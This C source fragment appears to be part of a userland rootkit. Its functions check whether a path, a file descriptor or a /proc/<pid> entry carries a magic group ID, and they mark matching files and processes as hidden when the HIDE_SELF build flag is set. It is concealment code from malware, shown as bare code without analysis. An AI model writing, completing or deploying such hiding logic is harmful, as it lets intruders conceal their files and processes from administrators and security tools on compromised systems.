int _hidden_path(const char *pathname, int mode){
#ifndef HIDE_SELF
    return 0;
#endif
    gid_t pathgid;
    if(mode == MODE_REG) pathgid = get_path_gid(pathname);
    if(mode == MODE_64) pathgid = get_path_gid64(pathname);

    if(pathgid == MAGIC_GID) return 1;
    return 0;
}

int _f_hidden_path(int fd, int mode){
#ifndef HIDE_SELF
    return 0;
#endif
    gid_t pathgid;
    if(mode == MODE_REG) pathgid = get_fd_gid(fd);
    if(mode == MODE_64) pathgid = get_fd_gid64(fd);

    if(pathgid == MAGIC_GID) return 1;
    return 0;
}

int _l_hidden_path(const char *pathname, int mode){
#ifndef HIDE_SELF
    return 0;
#endif
    gid_t pathgid;
    if(mode == MODE_REG) pathgid = lget_path_gid(pathname);
    if(mode == MODE_64) pathgid = lget_path_gid64(pathname);

    if(pathgid == MAGIC_GID) return 1;
    return 0;
}

int hidden_proc(pid_t pid){
#ifndef HIDE_SELF
    return 0;
#endif
    char proc_path[32];
    snprintf(proc_path, sizeof(proc_path), "/proc/%d", pid);
    return _hidden_path(proc_path, MODE_REG);
}